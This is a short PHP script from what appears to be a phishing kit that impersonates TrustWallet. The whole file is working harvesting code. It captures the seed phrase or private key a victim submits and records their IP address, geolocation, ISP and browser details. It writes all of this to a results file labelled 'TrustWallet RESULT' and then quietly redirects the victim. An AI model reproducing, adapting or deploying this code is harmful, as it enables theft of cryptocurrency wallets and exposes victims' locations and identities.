<?php 
include '../alexBackEnd/UserAgent.php';
include '../alexBackEnd/daerah.php';

// MENANGKAP DATA YANG DI-INPUT
$PrivateKey = $_POST['PrivateKey'];

$benua = $alex['continent'];
$negara = $alex['country'];
$region = $alex['regionName'];
$city = $alex['city'];
$latitude = $alex['lat'];
$longtitude = $alex['lon'];
$timezone = $alex['timezone'];
$perdana = $alex['isp'];
$ipaddress = $alex['query'];
$platform = $infos['platfrm_name'];
$osversi = $infos['platfrm_vers'];
$browser = $infos['browser_name'];

			    
$myfile = fopen("../result.txt", "a") or die("Unable to open file!");
$txt = "=== TrustWallet RESULT === \n\n";
fwrite($myfile, $txt);
$txt = "Pharse Or Private Key: $PrivateKey \n\n";
fwrite($myfile, $txt);
$txt = "Daerah: $negara / $region / $city / $latitude / $longtitude / $timezone \n";
fwrite($myfile, $txt);
$txt = "User Agents: $perdana / $ipaddress / $platform / $osversi / $browser \n\n\n\n";
fwrite($myfile, $txt);
$txt = "====================== \n\n";
fwrite($myfile, "-".$txt);
fclose($myfile);

header("Location: home.php"); 

?>